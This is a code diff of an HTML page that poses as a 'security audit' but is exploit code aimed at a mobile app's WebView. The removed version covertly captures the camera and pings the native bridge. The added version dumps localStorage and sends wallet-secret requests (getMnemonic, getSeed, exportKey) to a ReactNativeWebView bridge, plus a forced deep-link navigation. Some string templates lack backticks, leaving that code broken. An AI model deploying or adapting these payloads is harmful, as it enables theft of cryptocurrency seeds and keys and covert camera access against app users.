@@ -1,60 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Ultimate Persistence Bypass</title>
+    <title>Advanced Security Audit</title>
     <style>
-        body { background: #000; color: #ff00ea; font-family: monospace; text-align: center; padding-top: 50px; }
-        .trigger-box { border: 2px dashed #ff00ea; padding: 20px; margin: 20px; border-radius: 15px; }
-        #v { width: 1px; height: 1px; opacity: 0; } /* Kamera berjalan di background */
-        button { background: #ff00ea; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        .leak-box { border: 1px dashed #00ff00; padding: 15px; margin-top: 20px; background: #001100; }
+        .btn-exploit { background: #ff0000; color: white; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; }
+        .log-line { font-size: 11px; border-bottom: 1px solid #111; padding: 2px; }
     </style>
 </head>
 <body>
 
-    <div class="trigger-box">
-        <h3>[+] CRITICAL BYPASS TEST</h3>
-        <p>Status: <span id="s">Menunggu pemicu...</span></p>
-        <button onclick="exploit()">KLAIM HADIAH & BYPASS</button>
+    <h2>[ Audit Mode: Activated ]</h2>
+    
+    <button class="btn-exploit" onclick="runAudit()">JALANKAN SCAN LOGIKA SENSITIF</button>
+
+    <div class="leak-box">
+        <strong>Data Terdeteksi:</strong>
+        <div id="logs">Menunggu pemicu...</div>
     </div>
 
-    <video id="v" autoplay playsinline></video>
-
     <script>
-        const s = document.getElementById('s');
-        const v = document.getElementById('v');
-
-        async function exploit() {
-            s.innerText = "Mencoba mengelabui sistem origin...";
-            
-            try {
-                // Teknik 1: Mencoba akses kamera melalui blob (sering melewati CSP)
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" },
-                    audio: false 
-                });
-                
-                v.srcObject = stream;
-                s.innerHTML = "<b style='color:red'>SUCCESS: Kamera terbajak di background!</b>";
-                
-                // Teknik 2: Mencoba mencuri data bridge saat kamera aktif
-                if (window.webkit?.messageHandlers?.ReactNativeWebView) {
-                    window.webkit.messageHandlers.ReactNativeWebView.postMessage({
-                        type: "SENSITIVE_DATA_LEAK",
-                        origin: window.location.origin,
-                        status: "pwned"
-                    });
-                }
-            } catch (err) {
-                s.innerText = "Gagal: " + err.name;
-                // Jika gagal, coba teknik refresh-force
-                setTimeout(() => { window.location.reload(); }, 3000);
-            }
+        const logs = document.getElementById('logs');
+        function addLog(msg) {
+            const div = document.createElement('div');
+            div.className = 'log-line';
+            div.innerText = [${new Date().toLocaleTimeString()}] ${msg};
+            logs.insertBefore(div, logs.firstChild);
         }
 
-        // Auto-run untuk mengetes persistensi izin
-        window.onload = () => {
-            if (localStorage.getItem('pwned')) exploit();
-        };
+        async function runAudit() {
+            addLog("Memulai ekstraksi LocalStorage...");
+            
+            // 1. Mencoba membaca semua kunci di penyimpanan lokal
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const val = localStorage.getItem(key);
+                    addLog(DITEMUKAN: ${key} = ${val.substring(0, 20)}...);
+                }
+            } catch (e) { addLog("Storage Access Denied."); }
+
+            // 2. Mencoba bypass Bridge via Bruteforce (Zero-day style)
+            if (window.webkit?.messageHandlers?.ReactNativeWebView) {
+                const commands = ["getAccount", "getMnemonic", "getSeed", "exportKey"];
+                commands.forEach(cmd => {
+                    window.webkit.messageHandlers.ReactNativeWebView.postMessage({ type: cmd });
+                    addLog(Fuzzing Bridge: ${cmd});
+                });
+            }
+
+            // 3. Mencoba memicu Deep Link dari dalam WebView
+            // Jika aplikasi tidak memblokir navigasi ke skemanya sendiri
+            addLog("Mencoba navigasi internal...");
+            window.location.href = "frw://settings"; 
+        }
+
+        // Otomatis deteksi User Agent untuk mencari kebocoran info
+        addLog("User-Agent: " + navigator.userAgent);
     </script>
 </body>
 </html>
